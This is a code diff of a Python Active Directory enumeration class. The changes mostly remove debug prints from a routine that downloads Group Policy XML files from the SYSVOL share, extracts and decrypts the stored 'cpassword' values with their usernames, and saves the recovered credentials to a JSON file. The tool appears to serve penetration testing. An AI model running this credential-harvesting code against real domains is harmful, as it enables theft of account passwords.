@@ -261,15 +261,12 @@ class EnumAD():
                 if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
                     path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                     paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
-                    print(paths)
                     for dirname in paths:
-                        print(dirname)
                         try:
                             # Dont want . or ..
                             subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
                             for sub in subPath:
                                 if len(sub.get_shortname()) > 2:
-                                    print(dirname + '\\' + sub.get_shortname())
                                     paths.append(dirname + '\\' + sub.get_shortname())
                         except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                             continue
@@ -283,7 +280,6 @@ class EnumAD():
                 
                     # Since the first entry is the DC we dont want that
                     for item in paths[1:]:
-                        print('item: ' + str(item))
                         if '.xml' in item.split('\\')[-1]:
                             print('item .xml: ' + str(item))
                             with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
@@ -292,14 +288,11 @@ class EnumAD():
                                 try:
                                     fileContent = f.read()
                                     passwdMatch = cpassRE.findall(str(fileContent))
-                                    print(passwdMatch)
                                     for passwd in passwdMatch:
                                         unameMatch = unameRE.findall(str(fileContent))
-                                        print(unameMatch)
                                         for usr in unameMatch:
                                             padding = '=' * (4 - len(passwd) % 4) 
-                                            print(cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip())
-                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip()
+                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8')
                                 except (UnicodeDecodeError, AttributeError) as e:
                                     # Remove the files we had to write during the search
                                     os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
@@ -308,7 +301,6 @@ class EnumAD():
                             # Remove the files we had to write during the search
                             os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
 
-            print('')
             if len(cpasswords.keys()) > 0:
                 with open('{0}-cpasswords.json', 'w') as f:
                     json.dump(cpasswords, f)
